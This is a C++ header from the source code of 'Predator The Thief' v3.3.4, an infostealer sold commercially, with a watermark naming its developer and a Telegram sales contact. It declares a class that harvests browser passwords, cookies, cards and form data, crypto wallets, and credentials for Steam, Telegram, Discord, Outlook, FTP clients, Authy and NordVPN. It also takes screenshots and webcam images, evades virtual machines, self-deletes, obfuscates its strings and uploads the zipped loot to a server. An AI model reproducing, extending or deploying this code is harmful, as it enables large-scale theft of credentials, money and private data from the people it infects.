#pragma once

#include <string>
#include <Windows.h>
#include <WinInet.h>
#include <dshow.h>
#include <shlguid.h>

#include "BitmapType.h" // GDIPlus dynamic import

#include "../Defines.h"

#include "Hash.h"
#include "Module.h"
#include "Loader.h"
#include "Base64.h"
#include "SqlHandler.h"
#include "FireFoxGrabber.h"
#include "EdgeGrabber.h"
#include "xor.h"
#include "file.h"
#include "ZipWrapper.h"
#include "DynImport.h"
#include "qedit.h"

#define XOR(x) XorStr(x)

using std::string;
using std::vector;

#define VERSION XOR("Predator The Thief : v3.3.4 Release")
#define WATERMARK XOR("-----------------------------\r\n""| Developed by Alexuiop1337 |\r\n""-----------------------------\r\n""| Buy Predator at t.me/sett9 |\r\n""-----------------------------\r\n");
#define BOOL_STR(x) (x[0] == '1' ? true : false)
#define COPY_WALLET(x, y, z) { zip.addFolder(output_dir + '\\' + (string)x); bWallets |= CopyByMask(y, z, output_dir + '\\' + (string)x); }
#define IMPORT(var, x, y) var = FNC(x, y); while(var == nullptr) var = FNC(x, y);

EXTERN_C const CLSID CLSID_NullRenderer;
EXTERN_C const CLSID CLSID_SampleGrabber;

struct ScreenshotRoutine
{
	ZipWrapper & zip;
	unsigned int & screenshotIndex;
};

int GetEncoderClsid(WCHAR* format, CLSID* pClsid);
BOOL CALLBACK MonitorEnumProcCallback(HMONITOR hMonitor, HDC DevC, LPRECT lprcMonitor, LPARAM dwData);

struct Rule
{
	vector<string> pathes = vector<string>();
	vector<string> extensions = vector<string>();
	unsigned int iMaxFileSize;
	vector<string> exceptions = vector<string>();
	bool bRecursive;
};

struct Grabber
{
	bool bWebCam;
	bool bAntiVm;
	bool bSkype;
	bool bSteam;
	bool bScreenshot;
	unsigned int iSumFileSize;
	bool bSelfDelete;
	bool bTelegram;
	bool bWindowsCookie;
	vector<Rule> rules = vector<Rule>();
	unsigned char iStatus;
	string powershellScript = string();
	bool bHistory;
};

struct Data
{
	string path;
	string output;
};

class Stealing
{
	file File;
	Grabber grabber;

	string DecryptStr(const string& bytes);
	vector<byte> OutlookDecrypt(const vector<byte>& bytes);

	string ResolveLinkPath(const string & link);
	bool CopyByMask(const string& path, const string& mask, const string& output, size_t size = 0, bool secondLvl = false, const vector<string> & exceptions = vector<string>(), bool add_dir = false);
	void CopyByMaskRecursive(const string& path, const string& mask, const string& output, size_t size = 0, const vector<string> & exceptions = vector<string>(), bool add_dir = false);
	
	void GetStringRegKeyA(HKEY hkey, const string& strValueName, string& output, const string& def_value);
	void GetStringRegKeyBytes(HKEY hKey, const string& strValueName, vector<byte>& output, const vector<byte>& def_value);
	string ConvertUnicodeVectorToString(const vector<byte> & vec) const;

	string ExtractOutlook(HKEY hProfile);
	void OutlookScan(HKEY hStart, string & output, const string & prev_name);
	void RunOutlookScan(const string & entry, string & res);

	void __cpuid(int CPUInfo[4], int InfoType);
	void GetCpu(string& output);
	string GetCpuUsage();

	void SteamHelper(const string& entry, const string& output);
	bool splitBy(const string& str, char delim, vector<string>& output, bool leaveEmpty = false);

	string xml_get(const string& text, const string& attribute);
	string random_string(const size_t size);
	bool contains_record(const vector<string>& vec, const string& entry);
	string replaceEnvVar(const string & str, bool* extended);
	bool isNumeric(const string & str);
	string trimStr(const string & str, char symbol);
	string extractDomain(const string & domain);
	string stripToDirectory(const string & path);
	int HexStringToInt(const string & str) const;
	
	void RC4(string & buff, const string & key) const;
	string SHA1(const string & buff) const;
	string FoxmailDecode(bool v, const string & pHash);

	unsigned long long str2ull(const string & str);
	unsigned long long ToUnixTimeStamp(unsigned long long chromeTimeStamp);
	void NetscapeCookie(const string& cookie_path, string& output);
	void ProcessCookies(const string& path, string& output);

	string GetRequest(const string& site, const string& url);
#ifdef ONION_ROUTING
	string GetIp();
#endif

	void GetPasswords(const string& path);
	void GetCookies(const string& path);
	void GetForms(const string& path);
	void GetCards(const string& path);
	void GetHistory(const string& path);

	void GetFormsGecko(const string& path);
	void GetCookiesGecko(const string& path);
	void GetPasswordsGecko(const string& path);
	void GetHistoryGecko(const string& path);

	void GetSkype(const string& db_path);
	void GetWalletsByName(const string& entry, const string& output);

	Data pass, form, card;
	string cookiePath;
	Data solution;
	Data log;
	Data browserVersion;
	Data walletInfo;
	Data skype;
	vector<string> cookieList;

	string new_path;
	string walletOutput;
	
	string historyDir;
	string user_agent;
	string windows_version;

	string archiveBytes;
	
	vector<string> modules;
	vector<string> versions;
	bool softwareCalled = false;

	// Some internet stuff
	vector<string> urls;
	string city, lat, lon, ip, timeZone, zipCode;

	bool bDiscord = false;
	unsigned int cookieIndex = 0, historyIndex = 0, screenshotIndex = 0;
	WORD port;
	unsigned long long iSumFileSizes = 0;
	Loader* pLdr;
	
	constexpr unsigned int getDate();

	PROTO_CryptUnprotectData cryptUnprotectData;
	PROTO_FindClose findClose;
	PROTO_FindFirstFileA findFirstFileA;
	PROTO_FindNextFileA findNextFileA;

	PROTO_InternetSetOptionA internetSetOptionA;
	PROTO_InternetOpenA internetOpenA;
	PROTO_InternetConnectA internetConnectA;
	PROTO_HttpOpenRequestA httpOpenRequestA;
	PROTO_HttpSendRequestA httpSendRequestA;
	PROTO_InternetCloseHandle internetCloseHandle;

	PROTO_RegOpenKeyA regOpenKeyA;
	PROTO_RegCloseKey regCloseKey;
	PROTO_RegEnumKeyA regEnumKeyA;

#ifdef ONION_ROUTING
	static constexpr mini::size_type hops = 2;
#endif
public:
	vector<LoaderRule> rules;
	Loader* GetLoaderInstance();
	vector<unsigned int> hashes;
	string country;

	ZipWrapper zip = ZipWrapper((string)getenv(XOR("localappdata")) + XOR("Low\\") + random_string(XorInt(12)) + XOR(".zip"));	

	unsigned int passwords = 0, cookies = 0, cards = 0, forms = 0;
	bool bSteam = false, bTeleg = false, bWallets = false, bFileZilla = false, bWinFtp = false;

	const string define_browser(const string& path, bool user = true);
	void ReadAllText(const string& file, string & text);

	Stealing(const string& pass, const string& cookie,
		const string& formPath, const string& card,
		const string& log_path, const string& historyFolder,
		const string& skype_path, const string& wallet_path,
		const string& browser_version, const string& solution_output, 
		const string& walletInfo_path, DWORD port)
	{
		this->pass.path = pass;
		cookiePath = cookie;
		form.path = formPath;
		this->card.path = card;
		
		this->pass.output = "";
		this->form.output = "";
		this->card.output = "";

		this->new_path = (string)getenv(XOR("localappdata")) + XOR("Low\\") + random_string(XorInt(12)) + '.' + random_string(XorInt(3));
		log.path = log_path;
		this->historyDir = historyFolder;
		this->port = port;
		this->user_agent = XOR("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.") + 
			std::to_string(FNC(GetTickCount, XOR("Kernel32.dll"))()).substr(XorInt(4)) + XOR(".121 Safari/537.36");
		
		skype.path = skype_path;
		this->walletOutput = wallet_path;

		browserVersion.path = browser_version;
		solution.path = solution_output;
		walletInfo.path = walletInfo_path;
	}

	void InitApi();
	
	void GetEdgePasswords();
	void GetEdgeCookies();

	void GetWallets(const string& output_dir);
	
	void GetBrowsers(const string& path, int level = 1);

	void GetWindowsCookies();
	void GetCookieList(const string& output_path);

	void GetNordVpn(const string& output_dir);
	void GetFiles(const string& output_dir);
	void GetWinScp(const string& output_dir);
	void GetFtpClient(const string& output_dir);
	void GetAuthy(const string& output_dir);

	void GetOutlook(const string & output_dir);
	void GetFoxmail(const string & output_dir);

	void GetSteam(const string& output_dir);
	void GetBattleNetInformation(const string& output_dir);
	void GetOsu(const string& output_dir);

	void GetTelegram(const string& output_dir);
	void GetDiscord(const string& output_dir);
	void GetJabber(const string& output_dir);

	void GetInstalledSoftware(const string & path, HKEY hDefault = HKEY_LOCAL_MACHINE);
	void GetInformation(const string& output_path, const string& hwid, unsigned int hash);

	void GetScreenShot();
	void GetWebcamScreen(const string& output_path);

	void CleanUp(const string& url);
	
	Grabber GetSettings(const string& url, const string& query);

	void ProcessModules(const string & url);

	void Complete();
	string GetQuery(const string & key);
	bool Release(const string & server, const string & path, const string & file_name);
};